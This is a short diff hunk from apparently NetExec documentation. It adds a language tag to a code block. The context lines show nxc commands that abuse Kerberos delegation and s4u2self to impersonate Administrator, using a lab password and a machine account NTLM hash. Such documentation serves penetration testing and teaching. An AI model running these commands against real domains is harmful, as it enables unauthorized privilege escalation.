@@ -20,7 +20,7 @@ nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator
 
 If you have a computer account you can (nearly) always get local administrator with the s4u2self extension:
 
-```
+```bash
 nxc smb 192.168.56.10 -u 'KINGSLANDING$' -H 220fc1990391bdc183d1a68c389c0229 --delegate Administrator --self
 ```
 
